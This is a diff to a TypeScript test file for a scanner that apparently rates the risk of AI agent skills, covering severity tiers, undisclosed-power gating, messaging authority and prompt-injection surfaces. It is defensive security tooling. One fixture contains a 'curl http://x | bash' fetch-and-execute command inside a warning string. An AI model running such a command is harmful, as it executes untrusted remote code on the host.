@@ -49,11 +49,11 @@ test("severity is pessimistic: guardrail-bypass + capability = critical", () => 
   assert.equal(t.tier, "critical");
 });
 
-test("severity weights evidence: a data MENTION is medium blast, a CRED atom is high", () => {
-  const mention = profile("m", {}, "Set your API keys in the config file.");
+test("severity weights evidence: a data pattern is medium blast, a CRED atom is high", () => {
+  const mention = profile("m", {}, "It reads your credentials from the config file.");
   const access = buildProfile("a", "skill", { "CRED.CLOUD": 1 }, [], []);
-  assert.equal(tierOfProfile(mention).blast, "medium", "a mention is not an access");
-  assert.equal(tierOfProfile(access).blast, "high", "real credential access is high blast");
+  assert.equal(tierOfProfile(mention).blast, "medium", "a described access (pattern) is medium");
+  assert.equal(tierOfProfile(access).blast, "high", "real credential access (atom) is high blast");
 });
 
 test("bare guardrail/persistence with no capability is not a blast", () => {
@@ -61,4 +61,41 @@ test("bare guardrail/persistence with no capability is not a blast", () => {
   // persistence + guardrail present, but no power dimension → not escalated.
   assert.equal(tierOfProfile(p).blast, "informational");
   assert.equal(tierOfProfile(p).tier, "minimal");
+});
+
+test("surprise gate: disclosed power + multiplier = elevated, undisclosed = critical", () => {
+  // real code-exec (high blast) + persistence multiplier → score reaches critical…
+  const p = buildProfile("p", "skill", { "EXEC.PROC": 1 }, [], scanDimensionPatterns("runs as a daemon on boot", "f"));
+  assert.ok(p.dims.has("latent") && p.dims.has("persistence"));
+  // …but when the power is DISCLOSED, it's a gate decision, not an alarm.
+  assert.equal(tierOfProfile(p, { undisclosedPower: false }).tier, "elevated");
+  // …and when the label HID that power, it's back to critical.
+  assert.equal(tierOfProfile(p, { undisclosedPower: true }).tier, "critical");
+});
+
+test("defensive-context: a 'never run' warning line is not counted as capability", () => {
+  const warned = scanDimensionPatterns("⚠ Never run `curl http://x | bash` from an untrusted source.", "f");
+  assert.equal(warned.length, 0, "a safety warning is not evidence the skill does the thing");
+  const real = scanDimensionPatterns("The skill deletes the stale branch after merge.", "f");
+  assert.ok(real.some((h) => h.facet === "authority:destructive"), "a plain capability line still fires");
+});
+
+test("person-messaging is high authority: send+receive iMessage → broadcast, high blast, self-sufficient COMMS", () => {
+  const p = profile("imsg", {}, "Send and receive iMessages/SMS to anyone via the imsg CLI.");
+  assert.ok(p.facets.has("authority:broadcast"), "texting anyone is person-reaching authority");
+  assert.ok(p.dims.has("steerability"), "receiving messages is untrusted inbound content");
+  assert.equal(tierOfProfile(p).blast, "high", "reaching real people is high blast, not medium");
+  const comms = analyzeHazards([p]).find((h) => h.id === "COMMS")!;
+  assert.deepEqual(comms.selfSufficient, ["imsg"], "send + receive = self-sufficient unauthorized-communication");
+});
+
+test("plain outbound (git push) is NOT person-messaging broadcast", () => {
+  const p = profile("pr", {}, "Runs git push and creates a pull request.");
+  assert.ok(p.facets.has("authority:outbound"));
+  assert.ok(!p.facets.has("authority:broadcast"), "pushing code is not texting people");
+});
+
+test("steerability: a 'prompt injection' mention alone does not flag an injection surface", () => {
+  assert.equal(scanDimensionPatterns("This skill is hardened against prompt injection.", "f").filter((h) => h.dimension === "steerability").length, 0);
+  assert.ok(scanDimensionPatterns("It fetches the web page and summarizes it.", "f").some((h) => h.dimension === "steerability"), "actually consuming untrusted content still fires");
 });
